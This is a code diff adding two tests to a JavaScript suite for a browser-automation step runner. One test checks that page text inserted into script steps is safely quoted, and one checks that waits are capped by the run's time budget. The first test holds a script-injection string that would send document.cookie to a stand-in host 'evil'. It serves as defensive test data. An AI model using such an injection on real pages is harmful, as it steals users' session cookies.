@@ -151,4 +151,31 @@ suite('Paradis run_steps flow (E6)', () => {
 			other: paradisRunStepsFlowDescriptor(other) === other,
 		}, { properties: ['steps', 'continue_on_error', 'max_seconds'], mentions: true, other: true });
 	});
+	test('a reference inside a script is inserted as a quoted string value, so text from a page cannot run as code', async () => {
+		const hostile = `')||fetch('//evil?'+document.cookie)||('`;
+		const fake = fakeCall(name => name === 'get_text' ? text(`Text of the whole page.\nShowing characters 0-40 of 40 (end).\n\n${hostile}`) : text('ok'));
+		await paradisRunStepsFlow(fake.call, {
+			steps: [
+				{ tool: 'get_text', args: {} },
+				{ tool: 'evaluate_script', args: { function: '() => document.title.includes($1.text)' } },
+				{ tool: 'wait_until', args: { predicate: '() => document.body.innerText.includes($1.text)' } },
+				{ expect: { predicate: '() => location.hash === $1.text', timeout_ms: 1000 } },
+				{ tool: 'fill_by', args: { name: 'Search', value: '$1.text' } },
+			],
+		});
+		const quoted = JSON.stringify(hostile);
+		assert.deepStrictEqual(fake.calls.slice(1).map(call => JSON.parse(call.slice(call.indexOf(' ') + 1))), [
+			{ function: `() => document.title.includes(${quoted})` },
+			{ predicate: `() => document.body.innerText.includes(${quoted})`, timeout_seconds: 10 },
+			{ timeout_seconds: 1, predicate: `() => location.hash === ${quoted}` },
+			{ name: 'Search', value: hostile },
+		]);
+	});
+
+	test('waits inside a step are cut to the time left in the run', async () => {
+		const fake = fakeCall(() => text('ok'));
+		await paradisRunStepsFlow(fake.call, { max_seconds: 5, steps: [{ sleep_ms: 3000 }, { tool: 'wait_until', args: { text: 'Done', timeout_seconds: 60 } }, { tool: 'wait_for', args: { text: ['Done'], timeout: 60000 } }] });
+		assert.deepStrictEqual(fake.calls, ['wait_until {"text":"Done","timeout_seconds":2}', 'wait_for {"text":["Done"],"timeout":2000}']);
+	});
+
 });
